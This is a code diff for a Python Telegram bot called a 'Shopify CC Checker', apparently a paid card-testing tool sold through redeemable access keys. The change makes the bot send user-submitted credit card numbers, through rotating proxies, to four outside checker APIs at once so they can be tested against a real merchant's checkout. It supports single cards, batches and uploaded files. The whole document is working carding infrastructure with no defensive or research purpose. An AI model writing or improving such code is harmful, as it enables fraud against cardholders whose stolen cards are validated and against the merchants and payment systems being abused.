@@ -121,7 +121,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     welcome_text = (
         f"Hello {user.first_name}!\n\n"
-        f"🤖 Shopify CC Checker Bot is Online (Dual-API Active)\n"
+        f"🤖 Shopify CC Checker Bot is Online (4-API Active)\n"
         f"⚠️ Use /redeem <key> to activate access.\n"
         f"👑 Owner: {OWNER_USERNAME}"
     )
@@ -212,7 +212,6 @@ async def redeem_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text("✅ Sub Active!")
     
-    # Send notification to admins with Name, Username, and User ID
     username_str = f"@{user.username}" if user.username else "No Username"
     admin_notification = (
         f"🔔 **New Key Redeemed!**\n"
@@ -252,6 +251,19 @@ async def get_bin_info(bin_code):
         pass
     return "UNKNOWN", "UNKNOWN", "UNKNOWN"
 
+# Helper function to fetch from a single API endpoint
+async def fetch_api(client, url):
+    try:
+        response = await client.get(url)
+        if response.status_code == 200:
+            data = response.json()
+            if data and isinstance(data, dict):
+                return data
+    except Exception:
+        pass
+    return None
+
+# Ultimate 4-API Fastest Response Fetcher
 async def process_card_string(card_line, user_full_name):
     try:
         parts = card_line.split('|')
@@ -263,42 +275,35 @@ async def process_card_string(card_line, user_full_name):
         bin_info, bank_info, country_info = await get_bin_info(cc[:6])
         
         site_url = "https://ripnroll.com"
-        selected_proxies = random.sample(PROXY_LIST, min(3, len(PROXY_LIST)))
+        selected_proxies = random.sample(PROXY_LIST, min(4, len(PROXY_LIST)))
         
         res_data = None
         async with httpx.AsyncClient(timeout=25.0, follow_redirects=True) as client:
             
-            # --- API 1: rhaenyra.xyz ---
-            api_url_1 = f"http://rhaenyra.xyz/shopify?cc={quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxies[0])}"
-            try:
-                response = await client.get(api_url_1)
-                if response.status_code == 200:
-                    res_data = response.json()
-            except Exception:
-                pass
+            # 4 Distinct API URLs with 4 different proxies
+            url_1 = f"http://rhaenyra.xyz/shopify?cc={quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxies[0])}"
+            url_2 = f"https://web-production-c2d03.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(selected_proxies[1])}"
+            url_3 = f"http://216.250.119.63/?cc={quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxies[2])}"
+            url_4 = f"https://shopix.up.railway.app/shopii?cc={quote(formatted_cc)}&site={quote(site_url)}&proxy={quote(selected_proxies[3])}"
             
-            # --- API 2: Railway App ---
-            if not res_data or str(res_data.get("Approved", "False")).lower() != "true":
-                api_url_2 = f"https://web-production-c2d03.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(selected_proxies[1])}"
-                try:
-                    response = await client.get(api_url_2)
-                    if response.status_code == 200:
-                        res_data = response.json()
-                except Exception:
-                    pass
-
-            # --- API 3: Custom IP API ---
-            if not res_data or str(res_data.get("Approved", "False")).lower() != "true":
-                api_url_3 = f"http://216.250.119.63/?cc={quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxies[2])}"
-                try:
-                    response = await client.get(api_url_3)
-                    if response.status_code == 200:
-                        res_data = response.json()
-                except Exception:
-                    pass
+            # Fire all 4 APIs concurrently and pick the fastest successful response
+            tasks = [
+                fetch_api(client, url_1),
+                fetch_api(client, url_2),
+                fetch_api(client, url_3),
+                fetch_api(client, url_4)
+            ]
+            
+            completed = await asyncio.gather(*tasks)
+            for res in completed:
+                if res and isinstance(res, dict):
+                    # Check if response has valid data structure
+                    if "Response" in res or "Approved" in res or "Charged" in res:
+                        res_data = res
+                        break
 
         if not res_data:
-            return f"❌ {card_line} ➔ All 3 APIs & Proxies failed/timed out."
+            return f"❌ {card_line} ➔ All 4 APIs & Proxies failed/timed out."
         
         resp_status = res_data.get("Response", "UNKNOWN")
         price = res_data.get("Price", "$14.97")
@@ -340,7 +345,7 @@ async def chk_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     if not context.args:
         return
-    msg = await update.message.reply_text("⏳ Processing with 3 APIs & 3 Proxies...")
+    msg = await update.message.reply_text("⏳ Processing with 4 APIs & Proxies...")
     result = await process_card_string(" ".join(context.args), update.effective_user.first_name)
     await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text=result)
 
@@ -359,7 +364,7 @@ async def chks_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not card_lines:
         return
 
-    status_msg = await update.message.reply_text(f"⏳ Processing {len(card_lines)} cards across 3 APIs...")
+    status_msg = await update.message.reply_text(f"⏳ Processing {len(card_lines)} cards across 4 APIs...")
     tasks = [safe_process_card(line, update.effective_user.first_name) for line in card_lines]
     results = await asyncio.gather(*tasks)
     
@@ -380,7 +385,7 @@ async def chf_file_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not document:
         return
     
-    status_msg = await update.message.reply_text("⏳ Processing file via 3 APIs...")
+    status_msg = await update.message.reply_text("⏳ Processing file via 4 APIs...")
     try:
         file = await context.bot.get_file(document.file_id)
         file_bytes = await file.download_as_bytearray()
